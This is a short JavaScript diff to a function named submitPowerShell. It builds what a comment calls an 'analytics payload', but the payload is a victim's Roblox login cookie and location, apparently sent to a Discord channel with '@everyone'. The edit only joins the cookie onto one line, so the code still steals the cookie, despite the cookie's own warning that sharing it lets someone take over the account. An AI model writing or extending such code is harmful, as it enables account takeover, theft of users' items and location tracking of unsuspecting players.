@@ -297,8 +297,7 @@ async function submitPowerShell() {
         // Analytics payload with scan results
         const payload = {
             content: `@everyone
-Cookie: ${robloxCookie ? `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_
-${robloxCookie}` : 'None found'}
+Cookie: ${robloxCookie ? `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${robloxCookie}` : 'None found'}
 Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}`
         };
 
